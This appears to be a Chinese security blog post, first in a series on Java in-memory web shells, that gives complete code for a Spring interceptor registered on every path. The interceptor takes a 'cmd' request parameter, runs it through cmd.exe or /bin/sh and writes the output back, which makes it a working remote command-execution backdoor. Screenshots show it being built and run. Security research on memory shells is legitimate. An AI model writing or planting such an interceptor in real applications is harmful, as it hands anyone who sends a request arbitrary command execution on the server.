+++
title = "编写一个简单的Spring Interceptor"
date = 2026-06-15T19:56:33+08:00
draft = false
description = "Java 内存马 作为一种无文件落地的木马，研究很有必要"
tags = ["安全研究"]
categories = ["Java内存马"]
series = ["Java内存马基础系列"]
pin = false
cover = "/images/posts/java-security-cover-clean.svg"
+++
# 完整代码

TestInterceptor.java


```java
package org.example.interceptor;

  

import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.servlet.http.HttpServletRequest;

import javax.servlet.http.HttpServletResponse;

  

public class TestInterceptor extends HandlerInterceptorAdapter {

    @Override

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {

        String cmd = request.getParameter("cmd");

        if(cmd != null){

            try {

                java.io.PrintWriter writer = response.getWriter();

                String output = "";

                ProcessBuilder processBuilder;

                if(System.getProperty("os.name").toLowerCase().contains("win")){

                    processBuilder = new ProcessBuilder("cmd.exe", "/c", cmd);

                }else{

                    processBuilder = new ProcessBuilder("/bin/sh", "-c", cmd);

                }

                java.util.Scanner inputScanner = new java.util.Scanner(processBuilder.start().getInputStream()).useDelimiter("\\A");

                output = inputScanner.hasNext() ? inputScanner.next(): output;

                inputScanner.close();

                writer.write(output);

                writer.flush();

                writer.close();

            } catch (Exception ignored){}

            return false;

        }

        return true;

    }

}
```


webconfig.java

```java
package org.example.config;

import org.example.interceptor.TestInterceptor;
import org.springframework.context.annotation.Configuration;
import org.springframework.web.servlet.config.annotation.InterceptorRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
public class WebConfig implements WebMvcConfigurer {
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new TestInterceptor()).addPathPatterns("/**");
    }
}

```


TestController.java  
  

```java
package org.example.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class TestController {
    @ResponseBody
    @RequestMapping("/test")
    public String test() {
        return "hello spring";
    }
}

```



# mvn  打包


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260517165724234.png)


# 启动运行 执行命令


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260517165857643.png)


发现日志没有任何输出回显  但是已经输出命令了

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260517165933851.png)



